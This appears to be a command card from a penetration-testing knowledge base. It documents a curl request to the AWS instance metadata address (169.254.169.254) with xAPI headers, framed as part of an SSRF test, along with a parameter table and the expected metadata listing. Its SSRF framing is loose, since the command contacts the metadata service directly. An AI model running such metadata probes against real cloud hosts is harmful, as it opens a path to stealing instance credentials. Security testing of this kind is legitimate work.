---
data: >-
  curl -X GET
  "http://169.254.169.254/latest/meta-data?/statements?statementId=3b9e4565-07ac-475f-be1f-d5f590f40779"
  -H "X-Experience-API-Version: 1.0.3" -H "Authorization: Basic dGVzdDp0ZXN0" -H
  "Host: 169.254.169.254" --connect-timeout 5
tags:
  - ssrf
  - xapi
  - metadata
type: command
output: >-
  HTTP/1.0 200 OK with content listing AWS metadata paths like ami-id,
  instance-id, etc. (text/plain, 326 bytes)
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.029Z'
id: 7e15580d-ff39-406c-93e9-b25ee9de8db3
verified: false
validated: true
submitted: true
---
# curl-get-xapi-from-metadata

## Command

```bash
curl -X GET "http://169.254.169.254/latest/meta-data?/statements?statementId=3b9e4565-07ac-475f-be1f-d5f590f40779" \
  -H "X-Experience-API-Version: 1.0.3" \
  -H "Authorization: Basic dGVzdDp0ZXN0" \
  -H "Host: 169.254.169.254" \
  --connect-timeout 5
```

## Description

This curl command replicates the GET request for retrieving an xAPI statement via SSRF to the AWS metadata service, aiding in validation of metadata access in testing scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| URL | Metadata path with ?/statements and statementId query | Yes |
| `-H "X-Experience-API-Version: 1.0.3"` | xAPI version header | Yes |
| `-H "Authorization: Basic dGVzdDp0ZXN0"` | Base64-encoded Basic Auth ('test:test') | Yes |
| `-H "Host: 169.254.169.254"` | Forces host header for metadata service | Yes |
| `--connect-timeout 5` | Timeout for connection attempts | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://169.254.169.254/latest/meta-data?/statements?statementId=3b9e4565-07ac-475f-be1f-d5f590f40779" -H "X-Experience-API-Version: 1.0.3" -H "Authorization: Basic dGVzdDp0ZXN0"
```

### Advanced Usage

Include verbose output with `-v`:

```bash
curl -v -X GET "http://169.254.169.254/latest/meta-data?/statements?statementId=..." -H "..."
```

## Expected Output

HTTP/1.0 200 OK
Content-Type: text/plain

ami-id
instance-id
security-groups
...

(Same metadata directory as POST, ~326 bytes)

## Related

- [[commands/curl-post-xapi-to-metadata]]
- [[procedures/Test-LRS-Configuration-to-Trigger-SSRF]]
